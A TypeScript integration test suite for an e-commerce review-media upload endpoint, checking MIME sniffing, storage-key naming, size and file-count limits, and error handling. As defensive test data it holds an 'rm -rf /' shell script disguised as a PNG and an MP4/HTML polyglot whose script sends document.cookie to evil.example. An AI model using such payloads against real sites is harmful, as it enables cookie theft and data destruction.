import { medusaIntegrationTestRunner } from '@medusajs/test-utils'
import sharp from 'sharp'
import { getPublishableKeyHeaders } from '../helpers/store'

async function png(): Promise<Buffer> {
  return await sharp({
    create: { width: 4, height: 4, channels: 3, background: '#123456' },
  })
    .png()
    .toBuffer()
}

medusaIntegrationTestRunner({
  inApp: true,
  testSuite: ({ api, getContainer }) => {
    describe('POST /store/reviews/uploads', () => {
      let storeHeaders: Record<string, string>

      beforeAll(async () => {
        storeHeaders = await getPublishableKeyHeaders(getContainer())
      })

      it('accepts an image and returns media without exposing the storage path', async () => {
        const form = new FormData()
        form.append('files', new Blob([await png()] as BlobPart[], { type: 'image/png' }), 'photo.png')

        const response = await api.post('/store/reviews/uploads', form, {
          headers: storeHeaders,
        })

        expect(response.status).toEqual(201)
        expect(response.data.media).toHaveLength(1)
        expect(response.data.media[0].type).toEqual('image')
        expect(Object.keys(response.data.media[0]).sort()).toEqual(
          ['id', 'mime_type', 'thumbnail_url', 'type', 'url'].sort()
        )
      })

      it('rejects a shell script renamed to .png', async () => {
        const form = new FormData()
        form.append(
          'files',
          new Blob([Buffer.from('#!/bin/sh\nrm -rf /')] as BlobPart[], { type: 'image/png' }),
          'evil.png'
        )

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
      })

      // C1 regression. The client's filename must never reach the storage
      // key, because the default (local) file provider derives its key from
      // the filename verbatim and core mounts that directory with a bare
      // `express.static`, which picks Content-Type from the EXTENSION and
      // ignores the mimeType this plugin sniffed. Video is deliberately not
      // re-encoded, so an HTML/JS payload behind MP4 magic bytes survives
      // byte-for-byte - and /static is the same origin as the admin
      // dashboard. The fix is that the stored name is derived ENTIRELY from
      // the sniffed MIME plus a crypto-random token: no byte of the client
      // filename reaches the key, sanitized or otherwise.
      it('never lets the client filename reach the storage key or the served Content-Type', async () => {
        const payload = Buffer.concat([
          Buffer.from([0x00, 0x00, 0x00, 0x20]),
          Buffer.from('ftypisom', 'ascii'),
          Buffer.from(
            '\n<html><body><script>fetch("//evil.example/"+document.cookie)</script>PWNED</body></html>',
            'ascii'
          ),
        ])

        const form = new FormData()
        form.append(
          'files',
          new Blob([payload] as BlobPart[], { type: 'video/mp4' }),
          'pwn.html'
        )

        const response = await api.post('/store/reviews/uploads', form, {
          headers: storeHeaders,
        })

        expect(response.status).toEqual(201)

        const url: string = response.data.media[0].url

        expect(url.endsWith('.html')).toBe(false)
        expect(url).toMatch(/\.mp4$/)
        // Not "does not end in .html" alone: no fragment of the attacker's
        // name may survive anywhere in the key, not as a stem, not as a
        // sanitized suffix.
        expect(url).not.toContain('pwn')
        expect(url).not.toContain('html')
        expect(response.data.media[0].mime_type).toEqual('video/mp4')

        // The served header is the half that actually decides whether this
        // is stored XSS. /static is mounted by core's express-loader on the
        // same app the test harness boots, so it is reachable here.
        const served = await api.get(new URL(url).pathname, {
          headers: storeHeaders,
          responseType: 'arraybuffer',
        })

        expect(served.status).toEqual(200)
        expect(served.headers['content-type']).not.toMatch(/text\/html/)
        expect(served.headers['content-type']).toMatch(/video\/mp4/)
      })

      it('rejects a request with no files', async () => {
        const response = await api
          .post('/store/reviews/uploads', new FormData(), { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
      })

      // Proves the multer `limits.fileSize` ceiling (100MB, set in
      // src/api/store/reviews/middlewares.ts) is enforced at the transport
      // layer, before a single byte is buffered into the route/workflow -
      // not by the workflow's own settings-driven max_image_size_mb/
      // max_video_size_mb check, which is a distinct, later gate. The
      // resulting MulterError is converted by uploadReviewMediaFiles in
      // middlewares.ts into an actionable 4xx (see that file for why: left
      // unconverted this used to surface as an opaque 500 - see this
      // file's git history/the report for that earlier, now-fixed state).
      it('rejects a file larger than the multer fileSize ceiling, at the transport layer, with an actionable message', async () => {
        const oversized = Buffer.alloc(100 * 1024 * 1024 + 1)

        const form = new FormData()
        form.append('files', new Blob([oversized] as BlobPart[], { type: 'image/png' }), 'huge.png')

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.message).toMatch(/100MB/)
        expect(response.data.message.toLowerCase()).toContain('size')
      })

      // Proves the multer `limits.files` ceiling (20) is enforced at the
      // transport layer too, independent of the workflow's
      // max_media_per_review setting (default 5, checked later and
      // separately - see upload-review-media.spec.ts for that case).
      it('rejects a request with more files than the multer files ceiling, with an actionable message', async () => {
        const form = new FormData()
        for (let i = 0; i < 21; i++) {
          form.append('files', new Blob([Buffer.from('x')] as BlobPart[], { type: 'image/png' }), `f${i}.png`)
        }

        const response = await api
          .post('/store/reviews/uploads', form, { headers: storeHeaders })
          .catch((e) => e.response)

        expect(response.status).toEqual(400)
        expect(response.data.message).toMatch(/20/)
        expect(response.data.message.toLowerCase()).toContain('files')
      })

      // Proves the conversion in uploadReviewMediaFiles is narrowly scoped:
      // ONLY a multer.MulterError is converted to a 4xx. A genuine parse
      // failure that is NOT a MulterError - Busboy's own constructor
      // throws a plain Error ("Boundary not found") when the Content-Type
      // header is multipart/form-data but omits the required `boundary`
      // parameter, and multer's make-middleware.js passes that raw error
      // straight to next() without wrapping it - must still propagate
      // untouched and surface as a genuine 500, not be laundered into a
      // false 400. This is deliberately a raw Buffer body with a hand-set
      // header (not FormData/Blob): a native FormData body would force
      // axios to compute its own correct multipart Content-Type with a
      // boundary, which would defeat the point of this test.
      it('does not convert a non-multer parse error - it still surfaces as a 500', async () => {
        const body = Buffer.from(
          [
            '--MISSING',
            'Content-Disposition: form-data; name="files"; filename="a.png"',
            'Content-Type: image/png',
            '',
            'somebytes',
            '--MISSING--',
            '',
          ].join('\r\n')
        )

        const response = await api
          .post('/store/reviews/uploads', body, {
            headers: { ...storeHeaders, 'content-type': 'multipart/form-data' },
          })
          .catch((e) => e.response)

        expect(response.status).toEqual(500)
      })
    })
  },
})
